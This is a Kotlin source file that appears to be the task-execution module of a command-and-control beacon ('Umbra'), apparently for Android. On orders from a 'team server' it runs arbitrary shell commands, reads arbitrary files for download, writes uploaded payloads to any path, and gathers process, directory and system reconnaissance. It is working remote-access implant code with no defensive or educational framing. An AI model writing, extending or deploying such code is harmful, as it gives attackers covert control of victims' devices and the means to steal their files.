package io.umbra.beacon

import java.io.File
import java.util.concurrent.TimeUnit

/** Executes tasks handed out by the team server. */
object TaskRunner {
    const val MAX_OUTPUT = 900 * 1024

    class Outcome(val code: Long, val out: ByteArray, val err: String) {
        fun toValue(taskId: String): Upk.MapV = Upk.map(
            "id" to Upk.str(taskId),
            "code" to Upk.num(code),
            "out" to Upk.bin(out),
            "err" to Upk.str(err),
        )
    }

    fun shell(command: String, timeoutSec: Long): Outcome {
        if (command.isBlank()) return Outcome(1, ByteArray(0), "empty command")
        return try {
            val proc = ProcessBuilder("sh", "-c", command)
                .redirectErrorStream(true)
                .start()
            val finished = proc.waitFor(timeoutSec.coerceAtLeast(1), TimeUnit.SECONDS)
            if (!finished) {
                proc.destroyForcibly()
                return Outcome(124, ByteArray(0), "timeout after ${timeoutSec}s")
            }
            val output = proc.inputStream.use { it.readBytes() }
            val trimmed = if (output.size > MAX_OUTPUT) {
                output.copyOfRange(0, MAX_OUTPUT) + "\n[umbra: output truncated]\n".toByteArray()
            } else output
            Outcome(proc.exitValue().toLong(), trimmed, "")
        } catch (t: Throwable) {
            Outcome(127, ByteArray(0), "exec failed: ${t.message}")
        }
    }

    fun run(kind: String, args: Upk): Outcome {
        val path = args.field("path")?.text() ?: ""
        return when (kind) {
            "shell", "exec" -> shell(
                args.field("cmd")?.text() ?: "",
                args.field("timeout")?.long() ?: 60,
            )
            "sysinfo", "recon" -> Outcome(0, SysInfo.report().toByteArray(), "")
            "ls" -> listDir(if (path.isEmpty()) "/" else path)
            "download", "cat" -> {
                if (path.isEmpty()) Outcome(1, ByteArray(0), "download requires path")
                else try {
                    val data = File(path).readBytes()
                    Outcome(0, if (data.size > MAX_OUTPUT) data.copyOfRange(0, MAX_OUTPUT) else data, "")
                } catch (t: Throwable) {
                    Outcome(1, ByteArray(0), "download: ${t.message}")
                }
            }
            "upload" -> {
                val data = args.field("data")?.bytes() ?: ByteArray(0)
                if (path.isEmpty()) Outcome(1, ByteArray(0), "upload requires path")
                else try {
                    File(path).writeBytes(data)
                    Outcome(0, "wrote ${data.size} bytes to $path\n".toByteArray(), "")
                } catch (t: Throwable) {
                    Outcome(1, ByteArray(0), "upload: ${t.message}")
                }
            }
            "ps" -> processList()
            "sleep" -> Outcome(0, "sleep interval updated\n".toByteArray(), "")
            "exit", "kill" -> Outcome(0, "beacon exiting\n".toByteArray(), "")
            "ping" -> Outcome(0, "pong\n".toByteArray(), "")
            else -> Outcome(2, ByteArray(0), "unknown task kind \"$kind\"")
        }
    }

    /**
     * Best-effort process list. Android restricts /proc to the app's own uid on
     * modern releases, so this degrades to whatever is visible and says so.
     */
    private fun processList(): Outcome = try {
        val proc = File("/proc")
        val pids = proc.listFiles { f -> f.name.all { it.isDigit() } } ?: return Outcome(1, ByteArray(0), "ps: /proc not readable")
        val sb = StringBuilder()
        var visible = 0
        pids.mapNotNull { it.name.toIntOrNull() }.sorted().forEach { pid ->
            val cmdline = try {
                File("/proc/$pid/cmdline").readBytes().toString(Charsets.UTF_8).replace('\u0000', ' ').trim()
            } catch (_: Throwable) {
                ""
            }
            if (cmdline.isNotEmpty()) {
                visible += 1
                sb.append("%d %s%n".format(pid, cmdline))
            }
        }
        if (visible == 0) sb.append("ps: process list restricted by the platform\n")
        Outcome(0, sb.toString().toByteArray(), "")
    } catch (t: Throwable) {
        Outcome(1, ByteArray(0), "ps: ${t.message}")
    }

    private fun listDir(path: String): Outcome = try {
        val dir = File(path)
        val entries = dir.listFiles() ?: return Outcome(1, ByteArray(0), "not a directory: $path")
        val sb = StringBuilder()
        entries.sortedBy { it.name }.forEach { f ->
            val kind = if (f.isDirectory) "d" else "-"
            sb.append("%s %12d %s%n".format(kind, f.length(), f.absolutePath))
        }
        Outcome(0, sb.toString().toByteArray(), "")
    } catch (t: Throwable) {
        Outcome(1, ByteArray(0), "ls: ${t.message}")
    }
}
